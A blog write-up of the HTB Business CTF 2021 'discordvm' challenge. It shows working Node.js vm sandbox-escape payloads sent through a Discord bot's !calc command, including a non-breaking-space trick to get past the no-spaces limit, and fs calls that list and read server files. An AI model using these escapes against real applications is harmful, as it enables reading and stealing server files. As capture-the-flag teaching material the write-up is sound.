## HTB Business CTF 2021: discordvm

# Introduction
We introduced "sandboxing" using Node.js vm module on our calculator feature.
`https://discord.gg/<redacted>`

> Complete write up for the `discordvm` challenge at Business CTF 2021 hosted by [Hack The Box](https://www.hackthebox.eu/htb-business-ctf-2021). This article is a part of a HTB Business CTF 2021 series. 

> Learn more from additional readings found at the end of the article. I would be thankful if you mention me when using parts of this article in your work. Enjoy!

***
# Contents
1. [Introduction](#introduction)
* [Basic Information](#basic-information)
* [Recon](#recon)
* [Weaponizing](#weaponizing)
* [Exploit](#exploit)
* [Additional readings](#additional-readings)
***

# Basic Information

| #   |     |
| :-- | :-- |
|Type    | Jeopardy CTF / Miscellaneous
|Organized  by | [Hack The Box](https://hackthebox.eu/htb-business-ctf-2021/)
|Name    | **HTB Business CTF 2021 / discordvm**
| CTFtime weight | [24.33](https://ctftime.org/rating-formula/) 
|Started | 2021/07/23 12:00 UTC
|Ended | 2021/07/25 18:00 UTC
|URLs    | https://ctf.hackthebox.eu/ctf/135
|Author  | **Asentinn** / NetCrawlers
|       | https://ctftime.org/team/159004

%%[patreon-btn]

> 🔔 `CyberEthical.Me` is maintained purely from your donations - consider one-time sponsoring with the [Sponsor](/sponsor) button or 🎁 [become a Patron](https://www.patreon.com/cyberethicalme) which also gives you some bonus perks.

# Recon

We are provided with the Discord Server invite. 

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1627303578339/DkakSkJyc.png)

We are having single `general` channel, without permissions to send messages. In the message history we can read

> [+] Welcome to our mock Discord server! 👋 

> It is intended that you cannot send messages here. 🔒

> The purpose of this Discord server is to just host the Business CTF 2021 Misc challenge > called discordvm. :metal: 

> Do not DM anyone other than `@discordvm` . ⛔ 

> To interact with the challenge DM `@discordvm` the command !help. Have fun! 👏

So, the purpose of this challenge is to get the flag from the Discord Bot - `@discordvm`. We are also provided with the backend source code:

```js
const vm = require('vm');
const payload = '1+1';
console.log(vm.runInNewContext(payload));

// The Discord bot get's args[0], so pretty much the same setup except no spaces.
```

## Communication with the bot

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1627304096045/KMbYmTh82.png)

Bot reacts to the `!help` and `!calc` commands. Second one apparently just pass the arguments of command as a `payload` to the `vm.runInNewContext` NodeJS method.

# Weaponizing

Let's create a local NodeJS application that is obtaining the payload in its arguments, just like the bot.

```js
const vm = require('vm');
var myArgs = process.argv.slice(2);

console.log(vm.runInNewContext(myArgs[0]));
```

To run it, simply call `node main.js 1+1`

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1627304307486/TJJNNYDo7.png)

Now, working together with the [The unsecure node vm module](https://thegoodhacker.com/posts/the-unsecure-node-vm-module/) article I come up with the following Node VM escape command

```text
node main.js "(this.constructor.constructor('return this'))()"
```
![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1627304481835/O4mo9oOq3A.png)

# Exploit

Passing an exploit in the command does error out.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1627308677841/yrys4YzOn.png)

It seems like there is an issue with the space in the command. There are multiple ways to challenge that. I went with `String.fromCharCode("160")`

```text
!calc (this.constructor.constructor('return'+String.fromCharCode("160")+'this'))()
```

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1627310136104/3DaREOq6f.png)

We can see that returned is the `object`. Now, by enumerating available members or `this` we can find out that `fs` is loaded.

```
!calc (this.constructor.constructor('return'+String.fromCharCode("160")+'Object.entries(this)[9]'))()
```
![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1627310439967/1qDn6ZLGr.png)

This is what we need. Let's retrieve the flag from the file system.

```
!calc (this.constructor.constructor("return"+String.fromCharCode("160")+"this.fs.readdirSync('.')"))()
!calc (this.constructor.constructor("return"+String.fromCharCode("160")+"this.fs.readFileSync('flag.txt')"))()
```
![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1627310955408/_UrmpfYgz_.png)

> Do you like what you see? Join the [Hashnode.com](https://blog.cyberethical.me/join) now and start publishing. Things that are awesome:

>✔ Automatic GitHub Backup

>✔ Write in Markdown

>✔ Free domain mapping

>✔ CDN hosted images

>✔ Free built-in newsletter service

>✔ Built-in blog monetizing through the Sponsor feature

> By using my link, you can help me unlock the ambassador role, which cost you nothing and gives me some additional features to support my content creation mojo.

# Additional readings

> 📌 Follow the `#CyberEthical` hashtag on the social media

> 🎁 Become a Patron and [gain additional benefits](https://www.patreon.com/cyberethicalme)

> 👉 Instagram: [@cyber.ethical.me](https://www.instagram.com/cyber.ethical.me/)

> 👉 LinkedIn: [Kamil Gierach-Pacanek](https://www.linkedin.com/in/kamilpacanek)

> 👉 Twitter: [@cyberethical_me](https://twitter.com/cyberethical_me)

> 👉 Facebook: [@CyberEthicalMe](https://facebook.com/CyberEthicalMe)

* [The unsecure node vm module](https://thegoodhacker.com/posts/the-unsecure-node-vm-module/)
* [How do I read files in Node.js?
](https://nodejs.org/en/knowledge/file-system/how-to-read-files-in-nodejs/)